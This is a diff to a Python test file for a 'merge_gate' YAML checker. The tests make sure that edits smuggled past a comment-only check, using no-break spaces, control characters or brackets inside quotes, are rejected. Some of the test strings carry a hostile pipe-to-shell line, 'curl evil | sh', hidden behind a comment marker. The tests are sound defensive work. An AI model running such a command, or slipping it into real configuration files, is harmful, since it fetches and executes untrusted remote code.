@@ -83,7 +83,11 @@ class Yaml(unittest.TestCase):
                      "a:\n\t# tab\n",                                         # a tab
                      "run: echo hi\n  \u00a0# ; curl evil | sh\n",            # a no-break space keeps the scalar going
                      "a: b\u2028# c\n",                                       # a line break YAML doesn't use
-                     "a: b\x0c\n"):
+                     "a: b\x0c\n",
+                     'args: ["a]", "echo hi\n  # ; curl evil | sh\n  k: done"]\n',  # a bracket inside a quote
+                     'steps: [{"run": "x}]", "name": "n\n    # x\n    k: z"}]\n',
+                     "a: b\n# note\x01\n",                                    # a control character
+                     "a: b\n# \x7f\n", "a: b\n# \ufffe\n", "a: b\n# \x9b\n"):
             with self.subTest(text):
                 self.assertIsNone(merge_gate.yaml_meaning(text))
                 self.assertFalse(merge_gate.comment_only(text, "# note\n" + text))
@@ -118,7 +122,7 @@ class AgainstARealParser(unittest.TestCase):
             with open(path) as f:
                 texts.append(f.read())
         inserts = ["# note", "  # note", "        # note", "            # note", "\u00a0# x", "  \u00a0# || true",
-                   "", "    ", "#", "  #: not a key", "# |"]
+                   "", "    ", "#", "  #: not a key", "# |", "# note\x01", "# \x7f", "# \ufffe"]
         checked = 0
         for text in texts:
             lines = text.split("\n")
